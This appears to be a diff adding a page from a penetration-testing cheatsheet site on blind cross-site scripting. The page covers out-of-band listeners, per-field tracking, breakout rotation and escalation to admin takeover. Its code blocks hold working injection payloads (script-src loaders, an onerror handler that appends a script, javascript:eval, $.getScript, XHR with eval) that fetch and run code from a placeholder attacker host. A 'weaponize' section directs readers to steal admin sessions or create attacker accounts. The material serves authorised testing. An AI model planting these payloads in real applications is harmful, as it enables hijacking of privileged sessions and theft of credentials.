@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blind XSS · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XSS</nav><h1>Blind XSS</h1><p class="cx-lede">XSS that executes somewhere you can&#x27;t see - an admin panel, a moderation queue, a log viewer - detected with out-of-band callbacks that identify the vulnerable field and context.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059.007, T1185</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT CredentialTheft, AdminCompromise</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>Blind XSS is stored XSS whose render happens on a page you have no access to - a staff-only admin panel, a moderation queue, a log or analytics viewer, an emailed notification. You submit the payload, see nothing, and only find out it worked when it fires in someone else's browser. Because that someone is usually privileged, blind XSS is one of the most direct routes to an admin session - but you can only confirm it out-of-band.</p>
+<h2 id="tldr">TL;DR</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Payload loads a remote script named after the field it went into,
+# so the callback tells you WHICH field fired and WHERE.
+&lt;script src=//&lt;ATTACKER&gt;/username&gt;&lt;/script&gt;   → into the username field
+&lt;script src=//&lt;ATTACKER&gt;/ticket_body&gt;&lt;/script&gt; → into the ticket body
+# A hit on /username means the username field&#x27;s markup parsed and the browser
+# fetched your script. Have that script emit a SECOND beacon from inside JS to
+# prove it actually executed.</code></pre></figure>
+<p>Read the evidence in three levels, and don't skip ahead:</p>
+<ol>
+<li><strong>A plain request for your resource</strong> (the <code>&lt;script src&gt;</code> hit, a DNS lookup) proves the browser <em>fetched</em> it - which usually means your markup parsed - but not that your JavaScript ran. Scanners, URL-preview bots, and a script that 404s or is served with the wrong MIME type all produce a hit without execution.</li>
+<li><strong>A second beacon emitted from within your hosted script</strong> (e.g. the script does its own <code>fetch('//&lt;ATTACKER&gt;/exec?...')</code>) proves the JavaScript actually executed.</li>
+<li><strong>The context the beacon reports back</strong> (page URL, whether a privileged session is present) is what lets you claim an <em>admin</em> pivot - verify it, don't assume the viewer was an admin.</li>
+</ol>
+<p>Success indicator: that second, JS-emitted beacon - not merely the resource fetch.</p>
+<h2 id="where-blind-xss-lives">Where blind XSS lives</h2>
+<p>Any input that is reviewed later by someone else, through an interface you don't control:</p>
+<ul>
+<li>Support tickets, contact forms, abuse/bug reports</li>
+<li>Product reviews and comments held for moderation</li>
+<li>User-detail fields shown in an admin user-management panel</li>
+<li>Log and analytics dashboards that render <code>User-Agent</code>, <code>Referer</code>, or request paths</li>
+<li>Anything that generates a staff email or PDF/report from your input</li>
+</ul>
+<p>The <code>User-Agent</code> and <code>Referer</code> headers are classic blind sinks: they land in admin-facing log viewers that render them as HTML.</p>
+<h2 id="the-core-problem-no-feedback">The core problem: no feedback</h2>
+<p>You can't see the render, which creates two unknowns:</p>
+<ol>
+<li><strong>Which field is vulnerable?</strong> You may be injecting into many fields; any one of them could be the one that fires.</li>
+<li><strong>Which payload works?</strong> You can't watch the context, so you can't tell why a given payload failed.</li>
+</ol>
+<p>Both are solved by making execution phone home, and by encoding the field identity into the callback.</p>
+<h2 id="step-1-stand-up-an-out-of-band-listener">Step 1 - Stand up an out-of-band listener</h2>
+<p>You need something that records inbound HTTP (and ideally DNS) hits:</p>
+<ul>
+<li><strong>Burp Collaborator</strong> or <strong>Interactsh</strong> (<code>interactsh-client</code>) - unique callback hostnames, capture HTTP + DNS, no setup beyond the client.</li>
+<li><strong>XSS Hunter Express</strong> - purpose-built for blind XSS: its payloads auto-collect the page URL, DOM, cookies, and a screenshot of wherever they fired, which immediately tells you what the admin page looks like.</li>
+<li>A plain <code>php -S 0.0.0.0:80</code> or <code>python -m http.server</code> on a box you control, when you just need to see the hit.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Use infrastructure you are authorised to use and that fits the engagement's data-handling rules. XSS Hunter-style beacons can exfiltrate DOM, cookies, and screenshots of an internal admin panel - make sure that is in scope and that third-party/self-hosted collection is agreed before you point a client's staff browser at it.</p>
+</div>
+<h2 id="step-2-identify-the-field-with-per-field-callbacks">Step 2 - Identify the field with per-field callbacks</h2>
+<p>Name the callback after the field, so the inbound request tells you which input the browser parsed and fetched a script for:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Put a differently-named loader in each field
+&lt;script src=//&lt;ATTACKER&gt;/fullname&gt;&lt;/script&gt;
+&lt;script src=//&lt;ATTACKER&gt;/username&gt;&lt;/script&gt;
+&lt;script src=//&lt;ATTACKER&gt;/subject&gt;&lt;/script&gt;</code></pre></figure>
+<p>A request for <code>/username</code> means the username field's markup parsed and the browser fetched that loader. This is the key trick: it collapses "something fired" into "this specific field fired." (Per the three evidence levels above, the fetch indicates the injection parsed; have the hosted script emit its own beacon to confirm it then <em>executed</em>.)</p>
+<div class="cx-steps">
+<ol>
+<li>Submit one named loader per candidate field (skip fields with strict format validation like email, and secrets like passwords that aren't echoed).</li>
+<li>Wait - the render happens when a human opens the admin view, which can be minutes or hours.</li>
+<li>When a callback arrives, note the path (which field) and move to a real payload in that field.</li>
+</ol>
+</div>
+<h2 id="step-3-work-around-the-unknown-context">Step 3 - Work around the unknown context</h2>
+<p>You can't see the markup, so you can't tailor the breakout. Two strategies:</p>
+<ul>
+<li><strong>Rotate breakout prefixes</strong> across submissions, each still loading the same named remote script, so different contexts are covered:</li>
+</ul>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;script src=//&lt;ATTACKER&gt;/f1&gt;&lt;/script&gt;
+&quot;&gt;&lt;script src=//&lt;ATTACKER&gt;/f2&gt;&lt;/script&gt;
+&#x27;&gt;&lt;script src=//&lt;ATTACKER&gt;/f3&gt;&lt;/script&gt;
+&lt;img src=x onerror=&quot;s=document.createElement(&#x27;script&#x27;);s.src=&#x27;//&lt;ATTACKER&gt;/f4.js&#x27;;document.body.appendChild(s)&quot;&gt;
+javascript:eval(&#x27;var a=document.createElement(&quot;script&quot;);a.src=&quot;//&lt;ATTACKER&gt;/f5&quot;;document.body.appendChild(a)&#x27;)
+&lt;script&gt;$.getScript(&quot;//&lt;ATTACKER&gt;/f6&quot;)&lt;/script&gt;
+&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;,b);a.open(&quot;GET&quot;,&quot;//&lt;ATTACKER&gt;/f7&quot;);a.send()&lt;/script&gt;</code></pre></figure>
+<p>The callback path (<code>f1</code>…<code>f4</code>) tells you which breakout succeeded as well as which field. The fourth uses a handler to inject a <em>classic</em> <code>&lt;script&gt;</code> element for <code>innerHTML</code> sinks (which ignore bare <code>&lt;script&gt;</code>). Prefer this over <code>import('//…')</code>: a dynamic <code>import()</code> is an ES-module fetch that requires the hosted file to be served with CORS headers (<code>Access-Control-Allow-Origin</code>) and a JavaScript MIME type, which a quick <code>php -S</code> / <code>python -m http.server</code> does not send by default - so <code>import()</code> can produce a request that never executes. A classic script element has no such CORS requirement. The <code>javascript:</code> form (<code>f5</code>) fits <code>href</code>/URL contexts; <code>$.getScript</code> (<code>f6</code>) is a one-liner where the page already loads jQuery; and the <code>XMLHttpRequest</code> + <code>eval(this.responseText)</code> form (<code>f7</code>) fetches your payload and evals it. Reading a <em>cross-origin</em> response, though, needs <code>Access-Control-Allow-Origin</code> on your listener (the same caveat as <code>import()</code>): a plain <code>php -S</code> / <code>http.server</code> doesn't send it, so the request reaches <code>/f7</code> but the browser blocks the read and the <code>load</code> handler never runs anything. Use f7 only with a CORS-enabled listener (or a same-origin injection); for the no-CORS case prefer the classic <code>&lt;script src&gt;</code> / <code>$.getScript</code> loaders, which are exempt.
+- <strong>Prefer a remote script over an inline payload.</strong> Keep the injected value tiny and put all logic in the hosted script, so you can change what the payload <em>does</em> without re-injecting. Blind XSS succeeds most often where you can guess the context least - so lean on the loader and iterate server-side.</p>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>Blind XSS pairs naturally with <a href="../dom-based/index.html">DOM-based</a> sinks in admin SPAs: if the admin panel renders your value through <code>innerHTML</code>, a bare <code>&lt;script src&gt;</code> won't run but a handler that <em>appends a classic script element</em> (<code>onerror=…createElement('script')…</code>) will. Include that handler-based loader in your rotation - and prefer it to <code>import()</code>, which needs CORS + a JS MIME type from your server.</p>
+</div>
+<h2 id="step-4-weaponize-for-the-privileged-session">Step 4 - Weaponize for the privileged session</h2>
+<p>Once a field+breakout fires, the payload runs in the reviewer's browser. The useful actions target their privileges:</p>
+<ul>
+<li>Exfiltrate the admin session or DOM - the receiver and <code>document.cookie</code> / callback patterns are in <a href="../../sessions/xss-to-session/index.html">XSS to session</a>.</li>
+<li>If cookies are <code>HttpOnly</code>, drive the admin's own session: call the app's admin API from their browser to create an attacker account or change a role - see <a href="../../sessions/xss-csrf-chain/index.html">XSS+CSRF chain</a>.</li>
+<li>With XSS Hunter-style beacons, the auto-captured screenshot and DOM tell you what admin functionality is reachable before you commit to an action.</li>
+</ul>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>No callback ever.</strong> The field may be format-validated, never rendered, or rendered with correct output encoding. Confirm the loader itself isn't malformed, and try the handler-based (<code>onerror</code>) loader for <code>innerHTML</code> sinks.</li>
+<li><strong>Callback for the script but no follow-up exfil.</strong> The loader ran but the hosted script errored (CSP, syntax, blocked fetch). Check the admin page's CSP via what the beacon captured; adapt per <a href="../filter-bypasses/index.html#csp-bypass">Filter bypasses</a>.</li>
+<li><strong>Long delay misread as failure.</strong> Human-triggered renders are slow. Give it time before rotating.</li>
+<li><strong>Only DNS fires, not HTTP.</strong> A name was resolved but the HTTP connect was blocked (egress filtering, CSP <code>connect-src</code>/<code>script-src</code>), or something merely pre-resolved your hostname. Treat DNS-only as weak evidence that your markup was processed, not proof of execution - adjust to a permitted scheme/host and wait for the JS-emitted beacon.</li>
+<li><strong>Script fetched but never runs.</strong> A <code>&lt;script src&gt;</code> served with the wrong MIME type, or an <code>import()</code> without CORS headers, is fetched (you see the hit) but not executed. Serve classic scripts with the right content type, and avoid <code>import()</code> unless your listener sends CORS.</li>
+</ul>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Listener</td>
+<td>Collaborator / Interactsh / XSS Hunter / own server</td>
+</tr>
+<tr>
+<td>Identify</td>
+<td>One loader per field, named after the field</td>
+</tr>
+<tr>
+<td>Context</td>
+<td>Rotate breakout prefixes; encode which one in the path</td>
+</tr>
+<tr>
+<td>Delivery</td>
+<td>Remote-script loader, logic hosted (not inline)</td>
+</tr>
+<tr>
+<td>Weaponize</td>
+<td>Admin session theft / app-API abuse from their browser</td>
+</tr>
+</tbody>
+</table>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong>Named callback received</strong> → you know the field; switch that field to a real remote-script payload</li>
+<li><strong>Script loads but nothing exfiltrates</strong> → likely CSP on the admin page; see <a href="../filter-bypasses/index.html#csp-bypass">CSP bypass</a></li>
+<li><strong>Admin panel uses <code>innerHTML</code></strong> → handler-based loader that appends a classic script element (<code>&lt;img src=x onerror=…createElement('script')…&gt;</code>); see <a href="../dom-based/index.html">DOM-based</a></li>
+<li><strong>Got the admin session/DOM</strong> → exfil and reuse via <a href="../../sessions/xss-to-session/index.html">XSS to session</a></li>
+<li><strong><code>HttpOnly</code> cookies</strong> → act as the admin in-browser via <a href="../../sessions/xss-csrf-chain/index.html">XSS+CSRF chain</a></li>
+<li><strong>Putting it all together</strong> → <a href="../capstone-chain/index.html">Capstone chain</a></li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../filter-bypasses/index.html">Previous: Filter Bypasses</a><a class="cx-next" href="../capstone-chain/index.html">Next: XSS Capstone Chain</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
